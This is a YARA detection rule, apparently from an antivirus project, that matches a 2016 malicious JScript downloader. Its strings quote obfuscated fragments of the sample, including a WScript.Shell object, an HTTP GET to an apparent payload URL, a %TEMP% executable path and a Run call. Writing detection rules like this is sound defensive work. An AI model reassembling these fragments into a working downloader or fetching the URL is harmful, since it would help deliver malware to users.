rule sig_20160328_65ccffc8b836ef944a56636aea8bef61 {
  meta:
    description = "datamaliciousorder - file 20160328_65ccffc8b836ef944a56636aea8bef61.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "9c56f76abb231b242e8e9ca40006c6a3fc9daf03c51313e7fc3be74dd1f25165"

  strings:
    $s1  = "function Xvjwnp() {return Nihhf[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"fR5KzY6XaHP.exe\";};" fullword ascii
    $s2  = "Uaqmm[Ngzaqif](\"GET\", \"http://purelaces.com/ny6sja\", false);" fullword ascii
    $s3  = "do {WScript[Thdjcphha](Xxpiwbav() * 11)} while (Uaqmm[\"readystate\"] < 4 );" fullword ascii
    $s4  = "var Nihhf = function Mpomjh() {return WScript[Zfljh](\"WScript.Shell\");}();" fullword ascii
    $s5  = "function Vugzyem(Xertul, Jfttbse){return Xertul - Jfttbse;};" fullword ascii
    $s6  = "function Tnjblyecry(Qdwmkew){Nihhf[\"Run\"](Qdwmkew, Xnlknu, Xnlknu);};" fullword ascii
    $s7  = "function Vdambhstmp(Akjbyuez) {var Eijbeqnwre = (1, 2, 3, 4, 5, Akjbyuez); return Eijbeqnwre;};" fullword ascii
    $s8  = "function Twiwyytqnl() {return ((Txdzqlsc == true) && (Txdzqlsc == Pxwsak)) ? 1 : Xnlknu;};" fullword ascii
    $s9  = "Txdzqlsc = true; " fullword ascii
    $s10 = "Pxwsak = true; " fullword ascii
    $s11 = "function Rxdafkz(){return Zfljh;};" fullword ascii
    $s12 = "var Miffss = new this[\"Date\"]();" fullword ascii
    $s13 = "function Uitnxvzcn(){return Iccimfmk;};" fullword ascii
    $s14 = "var Yevnygq = false;" fullword ascii
    $s15 = "var Pxwsak = false;" fullword ascii
    $s16 = "return Vugzyem(Nvhrdp, Vjcxtpwj);" fullword ascii
    $s17 = "function Xxpiwbav(){return 22;};" fullword ascii
    $s18 = "var Txdzqlsc = false;" fullword ascii
    $s19 = " while (Axwnglt){" fullword ascii
    $s20 = "function Sgkhoknbl()" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}